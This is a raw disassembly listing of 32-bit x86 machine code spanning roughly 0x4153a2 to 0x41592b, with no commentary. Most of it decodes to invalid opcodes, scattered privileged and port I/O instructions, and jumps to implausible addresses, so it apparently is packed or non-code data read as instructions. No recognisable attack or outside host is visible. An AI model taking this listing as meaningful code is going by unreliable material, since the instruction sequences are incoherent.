  4153a2:	15 1d ec 80 99       	adc    $0x9980ec1d,%eax
  4153a7:	8b f8                	mov    %eax,%edi
  4153a9:	75 8b                	jne    0x415336
  4153ab:	e8 10 4b c1 bf       	call   0xc0029ec0
  4153b0:	d3 28                	shrl   %cl,(%eax)
  4153b2:	8a 5c 3e ff          	mov    -0x1(%esi,%edi,1),%bl
  4153b6:	84 db                	test   %bl,%bl
  4153b8:	7f d3                	jg     0x41538d
  4153ba:	b1 87                	mov    $0x87,%cl
  4153bc:	80 5f f1 5f          	sbbb   $0x5f,-0xf(%edi)
  4153c0:	4c                   	dec    %esp
  4153c1:	51                   	push   %ecx
  4153c2:	d7                   	xlat   %ds:(%ebx)
  4153c3:	2c 62                	sub    $0x62,%al
  4153c5:	db 22                	(bad) (%edx)
  4153c7:	fe                   	(bad)
  4153c8:	75 b4                	jne    0x41537e
  4153ca:	3c 02                	cmp    $0x2,%al
  4153cc:	75 06                	jne    0x4153d4
  4153ce:	4f                   	dec    %edi
  4153cf:	af                   	scas   %es:(%edi),%eax
  4153d0:	7f 3d                	jg     0x41540f
  4153d2:	c7                   	(bad)
  4153d3:	8c 77 2f             	mov    %?,0x2f(%edi)
  4153d6:	83 f3 8b             	xor    $0xffffff8b,%ebx
  4153d9:	fa                   	cli
  4153da:	4e                   	dec    %esi
  4153db:	d3 b8 ec 6d 9b dd    	sarl   %cl,-0x22649214(%eax)
  4153e1:	06                   	push   %es
  4153e2:	b1 70                	mov    $0x70,%cl
  4153e4:	5d                   	pop    %ebp
  4153e5:	64 a6                	cmpsb  %es:(%edi),%fs:(%esi)
  4153e7:	57                   	push   %edi
  4153e8:	a8 b9                	test   $0xb9,%al
  4153ea:	84 7f 83             	test   %bh,-0x7d(%edi)
  4153ed:	f4                   	hlt
  4153ee:	a0 66 5c d7 73       	mov    0x73d75c66,%al
  4153f3:	02 31                	add    (%ecx),%dh
  4153f5:	08 da                	or     %bl,%dl
  4153f7:	57                   	push   %edi
  4153f8:	bb 3a 03 2f 85       	mov    $0x852f033a,%ebx
  4153fd:	c0 b5 88 53 f0 b4 27 	shlb   $0x27,-0x4b0fac78(%ebp)
  415404:	4d                   	dec    %ebp
  415405:	b3 2d                	mov    $0x2d,%bl
  415407:	15 2a 52 03 f4       	adc    $0xf403522a,%eax
  41540c:	f8                   	clc
  41540d:	fc                   	cld
  41540e:	11 bc b9 b1 52 d0 a8 	adc    %edi,-0x572fad4f(%ecx,%edi,4)
  415415:	58                   	pop    %eax
  415416:	c7                   	(bad)
  415417:	f7 6d f8             	imull  -0x8(%ebp)
  41541a:	51                   	push   %ecx
  41541b:	2b 14 bf             	sub    (%edi,%edi,4),%edx
  41541e:	79 45                	jns    0x415465
  415420:	e8 89 55 ec 1b       	call   0x1c2da9ae
  415425:	0a 96 4d 65 2b 6f    	or     0x6f2b654d(%esi),%dl
  41542b:	0c 8b                	or     $0x8b,%al
  41542d:	17                   	pop    %ss
  41542e:	46                   	inc    %esi
  41542f:	94                   	xchg   %eax,%esp
  415430:	0c 94                	or     $0x94,%al
  415432:	6c                   	insb   (%dx),%es:(%edi)
  415433:	97                   	xchg   %eax,%edi
  415434:	2a 9a 51 04 19 f0    	sub    -0xfe6fbaf(%edx),%bl
  41543a:	b6 0e                	mov    $0xe,%dh
  41543c:	c5 c9 10             	(bad)
  41543f:	c3                   	ret
  415440:	34 b0                	xor    $0xb0,%al
  415442:	90                   	nop
  415443:	da 1f                	ficompl (%edi)
  415445:	08 31                	or     %dh,(%ecx)
  415447:	03 65 38             	add    0x38(%ebp),%esp
  41544a:	f7 d8                	neg    %eax
  41544c:	1b c0                	sbb    %eax,%eax
  41544e:	03 a5 b7 44 3d 1f    	add    0x1f3d44b7(%ebp),%esp
  415454:	98                   	cwtl
  415455:	c7                   	(bad)
  415456:	b2 78                	mov    $0x78,%dl
  415458:	2a ed                	sub    %ch,%ch
  41545a:	6e                   	outsb  %ds:(%esi),(%dx)
  41545b:	51                   	push   %ecx
  41545c:	57                   	push   %edi
  41545d:	b8 fe 08 29 c8       	mov    $0xc82908fe,%eax
  415462:	36 44                	ss inc %esp
  415464:	f0 42                	lock inc %edx
  415466:	74 3f                	je     0x4154a7
  415468:	0b c7                	or     %edi,%eax
  41546a:	89 ca                	mov    %ecx,%edx
  41546c:	22 28                	and    (%eax),%ch
  41546e:	05 bc e7 11 74       	add    $0x7411e7bc,%eax
  415473:	2b 7b ad             	sub    -0x53(%ebx),%edi
  415476:	5b                   	pop    %ebx
  415477:	2e 59                	cs pop %ecx
  415479:	e5 d1                	in     $0xd1,%eax
  41547b:	ff                   	(bad)
  41547c:	ff 0f                	decl   (%edi)
  41547e:	fd                   	std
  41547f:	10 1b                	adc    %bl,(%ebx)
  415481:	6b 05 e0 83 ee 03 82 	imul   $0xffffff82,0x3ee83e0,%eax
  415488:	1d 24 fc 1e b4       	sbb    $0xb41efc24,%eax
  41548d:	2f                   	das
  41548e:	02 87 12 24 cb 53    	add    0x53cb2412(%edi),%al
  415494:	fe 02                	incb   (%edx)
  415496:	b5 14                	mov    $0x14,%ch
  415498:	4e                   	dec    %esi
  415499:	05 ea 01 41 29       	add    $0x294101ea,%eax
  41549e:	cb                   	lret
  41549f:	89 f7                	mov    %esi,%edi
  4154a1:	80 c8 d9             	or     $0xd9,%al
  4154a4:	e6 51                	out    %al,$0x51
  4154a6:	6d                   	insl   (%dx),%es:(%edi)
  4154a7:	d9 4b d9             	(bad) -0x27(%ebx)
  4154aa:	cb                   	lret
  4154ab:	df e1                	(bad)
  4154ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4154ae:	c8 5b 5e 5f          	enter  $0x5e5b,$0x5f
  4154b2:	4f                   	dec    %edi
  4154b3:	33 d7                	xor    %edi,%edx
  4154b5:	89 c6                	mov    %eax,%esi
  4154b7:	31 2d aa 2b cb c0    	xor    %ebp,0xc0cb2baa
  4154bd:	09 32                	or     %esi,(%edx)
  4154bf:	30 d9                	xor    %bl,%cl
  4154c1:	ed                   	in     (%dx),%eax
  4154c2:	79 9e                	jns    0x415462
  4154c4:	e5 a6                	in     $0xa6,%eax
  4154c6:	d2 a9 24 8a 46 f8    	shrb   %cl,-0x7b975dc(%ecx)
  4154cc:	f8                   	clc
  4154cd:	e8 2b 7f 9e 65       	call   0x65dfd3fd
  4154d2:	57                   	push   %edi
  4154d3:	fa                   	cli
  4154d4:	fa                   	cli
  4154d5:	ea 20 29 d0 47 bd 54 	ljmp   $0x54bd,$0x47d02920
  4154dc:	cb                   	lret
  4154dd:	0e                   	push   %cs
  4154de:	50                   	push   %eax
  4154df:	cf                   	iret
  4154e0:	b6 5f                	mov    $0x5f,%dh
  4154e2:	88 d0                	mov    %dl,%al
  4154e4:	52                   	push   %edx
  4154e5:	bb bd ca d6 8a       	mov    $0x8ad6cabd,%ebx
  4154ea:	a1 f8 48 22 9f       	mov    0x9f2248f8,%eax
  4154ef:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4154f0:	57                   	push   %edi
  4154f1:	50                   	push   %eax
  4154f2:	18 b8 21 23 56 40    	sbb    %bh,0x40562321(%eax)
  4154f8:	47                   	inc    %edi
  4154f9:	31 b6 c3 e3 c5 a3    	xor    %esi,-0x5c3a1c3d(%esi)
  4154ff:	54                   	push   %esp
  415500:	30 18                	xor    %bl,(%eax)
  415502:	ea 2f f8 cd aa 78 c8 	ljmp   $0xc878,$0xaacdf82f
  415509:	c0 1a 5e             	rcrb   $0x5e,(%edx)
  41550c:	7c e4                	jl     0x4154f2
  41550e:	d8 c7                	fadd   %st(7),%st
  415510:	58                   	pop    %eax
  415511:	e0 46                	loopne 0x415559
  415513:	11 5f 80             	adc    %ebx,-0x80(%edi)
  415516:	8b ce                	mov    %esi,%ecx
  415518:	3f                   	aas
  415519:	5e                   	pop    %esi
  41551a:	94                   	xchg   %eax,%esp
  41551b:	53                   	push   %ebx
  41551c:	45                   	inc    %ebp
  41551d:	43                   	inc    %ebx
  41551e:	c4                   	(bad)
  41551f:	f7 d8                	neg    %eax
  415521:	45                   	inc    %ebp
  415522:	9f                   	lahf
  415523:	b1 b9                	mov    $0xb9,%cl
  415525:	ff                   	(bad)
  415526:	f8                   	clc
  415527:	83 fb 1f             	cmp    $0x1f,%ebx
  41552a:	76 05                	jbe    0x415531
  41552c:	bb 1f 70 21 4a       	mov    $0x4a21701f,%ebx
  415531:	3f                   	aas
  415532:	d8 3c 01             	fdivrs (%ecx,%eax,1)
  415535:	22 88 fd 0b 00 4b    	and    0x4b000bfd(%eax),%cl
  41553b:	8b c4                	mov    %esp,%eax
  41553d:	8b cb                	mov    %ebx,%ecx
  41553f:	8b d6                	mov    %esi,%edx
  415541:	34 ad                	xor    $0xad,%al
  415543:	82 42 50 79          	addb   $0x79,0x50(%edx)
  415547:	99                   	cltd
  415548:	39 97 36 8a db 20    	cmp    %edx,0x20db8a36(%edi)
  41554e:	c6 03 24             	movb   $0x24,(%ebx)
  415551:	06                   	push   %es
  415552:	5d                   	pop    %ebp
  415553:	20 cb                	and    %cl,%bl
  415555:	bd 18 d2 f6 a9       	mov    $0xa9f6d218,%ebp
  41555a:	30 28                	xor    %ch,(%eax)
  41555c:	5a                   	pop    %edx
  41555d:	f4                   	hlt
  41555e:	4d                   	dec    %ebp
  41555f:	28 6b 6c             	sub    %ch,0x6c(%ebx)
  415562:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  415563:	62 6c ab c3          	bound  %ebp,-0x3d(%ebx,%ebp,4)
  415567:	10 08                	adc    %cl,(%eax)
  415569:	ab                   	stos   %eax,%es:(%edi)
  41556a:	67 40                	addr16 inc %eax
  41556c:	ae                   	scas   %es:(%edi),%al
  41556d:	37                   	aaa
  41556e:	8d                   	lea    (bad),%esi
  41556f:	f0 23 8c 60 82 2e 00 	lock and 0x47002e82(%eax,%eiz,2),%ecx
  415576:	47 
  415577:	89 5d 1d             	mov    %ebx,0x1d(%ebp)
  41557a:	44                   	inc    %esp
  41557b:	29 6a d8             	sub    %ebp,-0x28(%edx)
  41557e:	ae                   	scas   %es:(%edi),%al
  41557f:	ce                   	into
  415580:	03 fc                	add    %esp,%edi
  415582:	7d d4                	jge    0x415558
  415584:	56                   	push   %esi
  415585:	d1 28                	shrl   $1,(%eax)
  415587:	0a d8                	or     %al,%bl
  415589:	29 71 0b             	sub    %esi,0xb(%ecx)
  41558c:	17                   	pop    %ss
  41558d:	aa                   	stos   %al,%es:(%edi)
  41558e:	ae                   	scas   %es:(%edi),%al
  41558f:	ab                   	stos   %eax,%es:(%edi)
  415590:	0e                   	push   %cs
  415591:	e6 0a                	out    %al,$0xa
  415593:	ac                   	lods   %ds:(%esi),%al
  415594:	3b 25 60 a1 50 6d    	cmp    0x6d50a160,%esp
  41559a:	09 aa 43 06 2b fb    	or     %ebp,-0x4d4f9bd(%edx)
  4155a0:	48                   	dec    %eax
  4155a1:	f7 a9 80 64 20 17    	imull  0x17206480(%ecx)
  4155a7:	f2 e8 8d 5e fe 43    	bnd call 0x443fb43a
  4155ad:	76 bb                	jbe    0x41556a
  4155af:	b6 7d                	mov    $0x7d,%dh
  4155b1:	ec                   	in     (%dx),%al
  4155b2:	88 45 eb             	mov    %al,-0x15(%ebp)
  4155b5:	0d 2d f3 17 da       	or     $0xda17f32d,%eax
  4155ba:	ac                   	lods   %ds:(%esi),%al
  4155bb:	63 61 1a             	arpl   %esp,0x1a(%ecx)
  4155be:	b8 bd db de 0e       	mov    $0xededbbd,%eax
  4155c3:	3a 75 0a             	cmp    0xa(%ebp),%dh
  4155c6:	19 f8                	sbb    %edi,%eax
  4155c8:	11 c8                	adc    %ecx,%eax
  4155ca:	ac                   	lods   %ds:(%esi),%al
  4155cb:	eb df                	jmp    0x4155ac
  4155cd:	09 e4                	or     %esp,%esp
  4155cf:	bb 31 e9 ca 76       	mov    $0x76cae931,%ebx
  4155d4:	5b                   	pop    %ebx
  4155d5:	16                   	push   %ss
  4155d6:	2e 25 b4 a1 fd fd    	cs and $0xfdfda1b4,%eax
  4155dc:	56                   	push   %esi
  4155dd:	91                   	xchg   %eax,%ecx
  4155de:	89 75 dc             	mov    %esi,-0x24(%ebp)
  4155e1:	51                   	push   %ecx
  4155e2:	52                   	push   %edx
  4155e3:	0c 63                	or     $0x63,%al
  4155e5:	5a                   	pop    %edx
  4155e6:	8b 24 bb             	mov    (%ebx,%edi,4),%esp
  4155e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4155ea:	f8                   	clc
  4155eb:	b7 7f                	mov    $0x7f,%bh
  4155ed:	73 02                	jae    0x4155f1
  4155ef:	31 db                	xor    %ebx,%ebx
  4155f1:	80 7d eb 4c          	cmpb   $0x4c,-0x15(%ebp)
  4155f5:	0a 29                	or     (%ecx),%ch
  4155f7:	ca 73 04             	lret   $0x473
  4155fa:	01 d1                	add    %edx,%ecx
  4155fc:	c7                   	(bad)
  4155fd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4155fe:	87 cb                	xchg   %ecx,%ebx
  415600:	cb                   	lret
  415601:	5c                   	pop    %esp
  415602:	04 c3                	add    $0xc3,%al
  415604:	0b 5a 0d             	or     0xd(%edx),%ebx
  415607:	ce                   	into
  415608:	f4                   	hlt
  415609:	a3 68 19 d1 0a       	mov    %eax,0xad11968
  41560e:	52                   	push   %edx
  41560f:	cf                   	iret
  415610:	42                   	inc    %edx
  415611:	77 bb                	ja     0x4155ce
  415613:	b6 c0                	mov    $0xc0,%dh
  415615:	60                   	pusha
  415616:	2c dd                	sub    $0xdd,%al
  415618:	8b 4e a1             	mov    -0x5f(%esi),%ecx
  41561b:	60                   	pusha
  41561c:	5c                   	pop    %esp
  41561d:	44                   	inc    %esp
  41561e:	f8                   	clc
  41561f:	2a 74 b0 f0          	sub    -0x10(%eax,%esi,4),%dh
  415623:	97                   	xchg   %eax,%edi
  415624:	b7 22                	mov    $0x22,%bh
  415626:	04 30                	add    $0x30,%al
  415628:	72 3c                	jb     0x415666
  41562a:	39 77 37             	cmp    %esi,0x37(%edi)
  41562d:	6b db 0a             	imul   $0xa,%ebx,%ebx
  415630:	ff 30                	push   (%eax)
  415632:	77 e9                	ja     0x41561d
  415634:	0a 2c 92             	or     (%edx,%edx,4),%ch
  415637:	c0 6d 93 03          	shrb   $0x3,-0x6d(%ebp)
  41563b:	e4 58                	in     $0x58,%al
  41563d:	28 da                	sub    %bl,%dl
  41563f:	4b                   	dec    %ebx
  415640:	1b c4                	sbb    %esp,%eax
  415642:	6e                   	outsb  %ds:(%esi),(%dx)
  415643:	cd 3b                	int    $0x3b
  415645:	52                   	push   %edx
  415646:	77 12                	ja     0x41565a
  415648:	ff 07                	incl   (%edi)
  41564a:	73 2f                	jae    0x41567b
  41564c:	14 de                	adc    $0xde,%al
  41564e:	7f 0c                	jg     0x41565c
  415650:	80 7c ce 61 1c       	cmpb   $0x1c,0x61(%esi,%ecx,8)
  415655:	c3                   	ret
  415656:	74 85                	je     0x4155dd
  415658:	26 6b 8f 80 bf dc ac 	imul   $0xffffffc3,%es:-0x53234080(%edi),%ecx
  41565f:	c3 
  415660:	24 df                	and    $0xdf,%al
  415662:	88 c1                	mov    %al,%cl
  415664:	37                   	aaa
  415665:	1d 28 f6 0b 9c       	sbb    $0x9c0bf628,%eax
  41566a:	65 5d                	gs pop %ebp
  41566c:	5c                   	pop    %esp
  41566d:	bd 8d 34 de 8b       	mov    $0x8bde348d,%ebp
  415672:	06                   	push   %es
  415673:	4d                   	dec    %ebp
  415674:	ed                   	in     (%dx),%eax
  415675:	c2 b7 80             	ret    $0x80b7
  415678:	d6                   	salc
  415679:	24 9d                	and    $0x9d,%al
  41567b:	8e 71 7f             	mov    0x7f(%ecx),%?
  41567e:	82 72 03 4d          	xorb   $0x4d,0x3(%edx)
  415682:	b3 6d                	mov    $0x6d,%bl
  415684:	ba d2 07 e9 a7       	mov    $0xa7e907d2,%edx
  415689:	73 03                	jae    0x41568e
  41568b:	19 89 69 69 96 97    	sbb    %ecx,-0x68699697(%ecx)
  415691:	bd 73 17 03 2a       	mov    $0x2a031773,%ebp
  415696:	73 4d                	jae    0x4156e5
  415698:	a3 22 5e 73 b6       	mov    %eax,0xb6735e22
  41569d:	f8                   	clc
  41569e:	72 13                	jb     0x4156b3
  4156a0:	31 e6                	xor    %esp,%esi
  4156a2:	07                   	pop    %es
  4156a3:	3d 5e 32 ed 27       	cmp    $0x27ed325e,%eax
  4156a8:	64 15 8e 89 dc 29    	fs adc $0x29dc898e,%eax
  4156ae:	d1 2f                	shrl   $1,(%edi)
  4156b0:	28 b6 22 2e e5 5d    	sub    %dh,0x5de52e22(%esi)
  4156b6:	d0 7b 13             	sarb   $1,0x13(%ebx)
  4156b9:	7d 79                	jge    0x415734
  4156bb:	fb                   	sti
  4156bc:	9b                   	fwait
  4156bd:	3b 53 04             	cmp    0x4(%ebx),%edx
  4156c0:	80 f9 44             	cmp    $0x44,%cl
  4156c3:	74 11                	je     0x4156d6
  4156c5:	04 55                	add    $0x55,%al
  4156c7:	74 2a                	je     0x4156f3
  4156c9:	58                   	pop    %eax
  4156ca:	75 d0                	jne    0x41569c
  4156cc:	b9 1f 20 fe 15       	mov    $0x15fe201f,%ecx
  4156d1:	fe                   	(bad)
  4156d2:	23 f7                	and    %edi,%esi
  4156d4:	43                   	inc    %ebx
  4156d5:	04 83                	add    $0x83,%al
  4156d7:	15 f7 ff 1d c4       	adc    $0xc41dfff7,%eax
  4156dc:	db 1b                	fistpl (%ebx)
  4156de:	83 23 00             	andl   $0x0,(%ebx)
  4156e1:	f7 5b c2             	negl   -0x3e(%ebx)
  4156e4:	62 23                	bound  %esp,(%ebx)
  4156e6:	b0 2d                	mov    $0x2d,%al
  4156e8:	41                   	inc    %ecx
  4156e9:	4e                   	dec    %esi
  4156ea:	88 06                	mov    %al,(%esi)
  4156ec:	c3                   	ret
  4156ed:	c0 c0 4f             	rol    $0x4f,%al
  4156f0:	00 da                	add    %bl,%dl
  4156f2:	8d 75 af             	lea    -0x51(%ebp),%esi
  4156f5:	52                   	push   %edx
  4156f6:	00 1f                	add    %bl,(%edi)
  4156f8:	83 58 7e 03          	sbbl   $0x3,0x7e(%eax)
  4156fc:	df 48 79             	fisttps 0x79(%eax)
  4156ff:	59                   	pop    %ecx
  415700:	92                   	xchg   %eax,%edx
  415701:	db b6 97 4a e9 04    	(bad) 0x4e94a97(%esi)
  415707:	3a 72 03             	cmp    0x3(%edx),%dh
  41570a:	07                   	pop    %es
  41570b:	07                   	pop    %es
  41570c:	26 16                	es push %ss
  41570e:	1d ed bf fb 03       	sbb    $0x3fbbfed,%eax
  415713:	47                   	inc    %edi
  415714:	84 59 89             	test   %bl,-0x77(%ecx)
  415717:	03 6d 09             	add    0x9(%ebp),%ebp
  41571a:	d0 75 ca             	shlb   $1,-0x36(%ebp)
  41571d:	8d 4d af             	lea    -0x51(%ebp),%ecx
  415720:	29 f1                	sub    %esi,%ecx
  415722:	90                   	nop
  415723:	0b 85 25 8a e0 27    	or     0x27e08a25(%ebp),%eax
  415729:	76 38                	jbe    0x415763
  41572b:	77 76                	ja     0x4157a3
  41572d:	f3 dd 70 97          	repz fnsave -0x69(%eax)
  415731:	0a b0 30 57 0e fa    	or     -0x5f1a8d0(%eax),%dh
  415737:	c3                   	ret
  415738:	8e 15 06 33 c3 cd    	mov    0xcdc33306,%ss
  41573e:	22 0f                	and    (%edi),%cl
  415740:	85 3d df 92 e7 b8    	test   %edi,0xb8e792df
  415746:	90                   	nop
  415747:	af                   	scas   %es:(%edi),%eax
  415748:	f5                   	cmc
  415749:	c0 79 0e 25          	sarb   $0x25,0xe(%ecx)
  41574d:	86 aa 9f 11 13 f6    	xchg   %ch,-0x9ecee61(%edx)
  415753:	02 64 7a 09          	add    0x9(%edx,%edi,2),%ah
  415757:	b7 83                	mov    $0x83,%bh
  415759:	64 2b c8             	fs sub %eax,%ecx
  41575c:	66 9f                	data16 lahf
  41575e:	53                   	push   %ebx
  41575f:	5c                   	pop    %esp
  415760:	e0 fe                	loopne 0x415760
  415762:	41                   	inc    %ecx
  415763:	e6 cc                	out    %al,$0xcc
  415765:	34 01                	xor    $0x1,%al
  415767:	0e                   	push   %cs
  415768:	d1 20                	shll   $1,(%eax)
  41576a:	5c                   	pop    %esp
  41576b:	20 28                	and    %ch,(%eax)
  41576d:	b0 b3                	mov    $0xb3,%al
  41576f:	89 c2                	mov    %eax,%edx
  415771:	fc                   	cld
  415772:	cb                   	lret
  415773:	9c                   	pushf
  415774:	fd                   	std
  415775:	c2 18 95             	ret    $0x9518
  415778:	f4                   	hlt
  415779:	eb 42                	jmp    0x4157bd
  41577b:	31 c9                	xor    %ecx,%ecx
  41577d:	20 b0 14 6f 10 7f    	and    %dh,0x7f106f14(%eax)
  415783:	61                   	popa
  415784:	ac                   	lods   %ds:(%esi),%al
  415785:	a1 c8 eb 35 be       	mov    0xbe35ebc8,%eax
  41578a:	e4 35                	in     $0x35,%al
  41578c:	e0 05                	loopne 0x415793
  41578e:	be 44 47 f4 8c       	mov    $0x8cf44744,%esi
  415793:	b5 36                	mov    $0x36,%ch
  415795:	06                   	push   %es
  415796:	1c 93                	sbb    $0x93,%al
  415798:	c2 6f 3e             	ret    $0x3e6f
  41579b:	32 f6                	xor    %dh,%dh
  41579d:	5b                   	pop    %ebx
  41579e:	d6                   	salc
  41579f:	34 f0                	xor    $0xf0,%al
  4157a1:	89 f0                	mov    %esi,%eax
  4157a3:	eb 0b                	jmp    0x4157b0
  4157a5:	33 7c 09 f6          	xor    -0xa(%ecx,%ecx,1),%edi
  4157a9:	74 ba                	je     0x415765
  4157ab:	ad                   	lods   %ds:(%esi),%eax
  4157ac:	45                   	inc    %ebp
  4157ad:	df aa 70 3b 4d e0    	fildll -0x1fb2c490(%edx)
  4157b3:	77 3b                	ja     0x4157f0
  4157b5:	05 6b 99 22 67       	add    $0x6722996b,%eax
  4157ba:	4f                   	dec    %edi
  4157bb:	60                   	pusha
  4157bc:	29 1d 13 a5 db 1e    	sub    %ebx,0x1edba513
  4157c2:	ab                   	stos   %eax,%es:(%edi)
  4157c3:	e3 9a                	jecxz  0x41575f
  4157c5:	4f                   	dec    %edi
  4157c6:	89 f9                	mov    %edi,%ecx
  4157c8:	b5 5f                	mov    $0x5f,%ch
  4157ca:	1f                   	pop    %ds
  4157cb:	50                   	push   %eax
  4157cc:	84 43 1b             	test   %al,0x1b(%ebx)
  4157cf:	98                   	cwtl
  4157d0:	40                   	inc    %eax
  4157d1:	48                   	dec    %eax
  4157d2:	e0 2c                	loopne 0x415800
  4157d4:	03 be db fe 6e e9    	add    -0x16910125(%esi),%edi
  4157da:	fb                   	sti
  4157db:	af                   	scas   %es:(%edi),%eax
  4157dc:	b7 01                	mov    $0x1,%bh
  4157de:	eb 02                	jmp    0x4157e2
  4157e0:	b7 00                	mov    $0x0,%bh
  4157e2:	36 b3 76             	ss mov $0x76,%bl
  4157e5:	47                   	inc    %edi
  4157e6:	74 3f                	je     0x415827
  4157e8:	b3 01                	mov    $0x1,%bl
  4157ea:	dd e5                	fucom  %st(5)
  4157ec:	97                   	xchg   %eax,%edi
  4157ed:	df 06                	filds  (%esi)
  4157ef:	45                   	inc    %ebp
  4157f0:	74 38                	je     0x41582a
  4157f2:	b3 02                	mov    $0x2,%bl
  4157f4:	46                   	inc    %esi
  4157f5:	74 12                	je     0x415809
  4157f7:	b3 03                	mov    $0x3,%bl
  4157f9:	4e                   	dec    %esi
  4157fa:	74 79                	je     0x415875
  4157fc:	4d                   	dec    %ebp
  4157fd:	df 60 de             	fbld   -0x22(%eax)
  415800:	6c                   	insb   (%dx),%es:(%edi)
  415801:	3d 02 b3 04 b8       	cmp    $0xb804b302,%eax
  415806:	12 05 39 c2 76 25    	adc    0x2576c239,%al
  41580c:	ba 2a 6e bb 03       	mov    $0x3bb6e2a,%edx
  415811:	f6 1b                	negb   (%ebx)
  415813:	75 1b                	jne    0x415830
  415815:	c2 15 f0             	ret    $0xf015
  415818:	81 21 d8 1e d5 8b    	andl   $0x8bd51ed8,(%ecx)
  41581e:	5e                   	pop    %esi
  41581f:	ba fb a3 a3 b8       	mov    $0xb8a3a3fb,%edx
  415824:	b5 e8                	mov    $0xe8,%ch
  415826:	12 28                	adc    (%eax),%ch
  415828:	b8 0f 82 50 f9       	mov    $0xf950820f,%eax
  41582d:	8b 4d 41             	mov    0x41(%ebp),%ecx
  415830:	bb 8f 89 f2 22       	mov    $0x22f2898f,%ebx
  415835:	b8 7f de a5 31       	mov    $0x31a5de7f,%eax
  41583a:	2a f7                	sub    %bh,%dh
  41583c:	42                   	inc    %edx
  41583d:	61                   	popa
  41583e:	8f c3                	pop    %ebx
  415840:	50                   	push   %eax
  415841:	d8 1b                	fcomps (%ebx)
  415843:	14 01                	adc    $0x1,%al
  415845:	57                   	push   %edi
  415846:	8c c3                	mov    %es,%ebx
  415848:	4f                   	dec    %edi
  415849:	10 cf                	adc    %cl,%bh
  41584b:	15 cc 08 68 28       	adc    $0x286808cc,%eax
  415850:	bf eb 20 d6 cb       	mov    $0xcbd620eb,%edi
  415855:	4c                   	dec    %esp
  415856:	c9                   	leave
  415857:	9a 00 0c 03 ca ae ae 	lcall  $0xaeae,$0xca030c00
  41585e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41585f:	08 ce                	or     %cl,%dh
  415861:	2f                   	das
  415862:	d7                   	xlat   %ds:(%ebx)
  415863:	66 60                	pushaw
  415865:	38 50 4c             	cmp    %dl,0x4c(%eax)
  415868:	aa                   	stos   %al,%es:(%edi)
  415869:	d6                   	salc
  41586a:	67 0c a3             	addr16 or $0xa3,%al
  41586d:	22 db                	and    %bl,%bl
  41586f:	f7 cd c7 f2 08 91    	test   $0x9108f2c7,%ebp
  415875:	87 d1                	xchg   %edx,%ecx
  415877:	4d                   	dec    %ebp
  415878:	78 47                	js     0x4158c1
  41587a:	04 1a                	add    $0x1a,%al
  41587c:	05 13 20 8c c2       	add    $0xc28c2013,%eax
  415881:	dd d0                	fst    %st(0)
  415883:	16                   	push   %ss
  415884:	d4 51                	aam    $0x51
  415886:	dd 89 77 f0 bb 02    	fisttpll 0x2bbf077(%ecx)
  41588c:	14 27                	adc    $0x27,%al
  41588e:	e1 c0                	loope  0x415850
  415890:	fa                   	cli
  415891:	7f 28                	jg     0x4158bb
  415893:	d3 61 7f             	shll   %cl,0x7f(%ecx)
  415896:	2b 49 89             	sub    -0x77(%ecx),%ecx
  415899:	c0 2b ca             	shrb   $0xca,(%ebx)
  41589c:	3b c1                	cmp    %ecx,%eax
  41589e:	7d 24                	jge    0x4158c4
  4158a0:	1b b8 0a 4d ba 74    	sbb    0x74ba4d0a(%eax),%edi
  4158a6:	f8                   	clc
  4158a7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4158a8:	ed                   	in     (%dx),%eax
  4158a9:	c9                   	leave
  4158aa:	8e 95 4b a2 f6 ef    	mov    -0x10095db5(%ebp),%ss
  4158b0:	7a eb                	jp     0x41589d
  4158b2:	0c 3f                	or     $0x3f,%al
  4158b4:	06                   	push   %es
  4158b5:	f5                   	cmc
  4158b6:	df 5e bf             	fistps -0x41(%esi)
  4158b9:	1b 3b                	sbb    (%ebx),%edi
  4158bb:	c2 7c 43             	ret    $0x437c
  4158be:	eb 30                	jmp    0x4158f0
  4158c0:	03 db                	add    %ebx,%ebx
  4158c2:	5e                   	pop    %esi
  4158c3:	b0 57                	mov    $0x57,%al
  4158c5:	75 60                	jne    0x415927
  4158c7:	7f 2a                	jg     0x4158f3
  4158c9:	4a                   	dec    %edx
  4158ca:	34 16                	xor    $0x16,%al
  4158cc:	2b 85 94 46 38 7d    	sub    0x7d384694(%ebp),%eax
  4158d2:	f1                   	int1
  4158d3:	3e b6 01             	ds mov $0x1,%dh
  4158d6:	07                   	pop    %es
  4158d7:	92                   	xchg   %eax,%edx
  4158d8:	2c eb                	sub    $0xeb,%al
  4158da:	0e                   	push   %cs
  4158db:	8d 95 62 c1 82 82    	lea    -0x7d7d3e9e(%ebp),%edx
  4158e1:	00 e0                	add    %ah,%al
  4158e3:	15 28 74 a2 51       	adc    $0x51a27428,%eax
  4158e8:	07                   	pop    %es
  4158e9:	63 28                	arpl   %ebp,(%eax)
  4158eb:	6a 1b                	push   $0x1b
  4158ed:	70 bc                	jo     0x4158ab
  4158ef:	de 5d 50             	ficomps 0x50(%ebp)
  4158f2:	08 52 0b             	or     %dl,0xb(%edx)
  4158f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4158f6:	34 59                	xor    $0x59,%al
  4158f8:	16                   	push   %ss
  4158f9:	65 00 30             	add    %dh,%gs:(%eax)
  4158fc:	18 01                	sbb    %al,(%ecx)
  4158fe:	48                   	dec    %eax
  4158ff:	06                   	push   %es
  415900:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415901:	b7 00                	mov    $0x0,%bh
  415903:	aa                   	stos   %al,%es:(%edi)
  415904:	0e                   	push   %cs
  415905:	8a 54 ea 30          	mov    0x30(%edx,%ebp,8),%dl
  415909:	d9 46 f1             	flds   -0xf(%esi)
  41590c:	f6 21                	mulb   (%ecx)
  41590e:	72 f2                	jb     0x415902
  415910:	04 0d                	add    $0xd,%al
  415912:	74 ed                	je     0x415901
  415914:	34 cb                	xor    $0xcb,%al
  415916:	4a                   	dec    %edx
  415917:	de 84 47 b9 41 07 13 	fiadds 0x130741b9(%edi,%eax,2)
  41591e:	4d                   	dec    %ebp
  41591f:	77 d6                	ja     0x4158f7
  415921:	32 14 0f             	xor    (%edi,%ecx,1),%dl
  415924:	60                   	pusha
  415925:	29 50 8d             	sub    %edx,-0x73(%eax)
  415928:	11 76 c1             	adc    %esi,-0x3f(%esi)
  41592b:	9d                   	popf
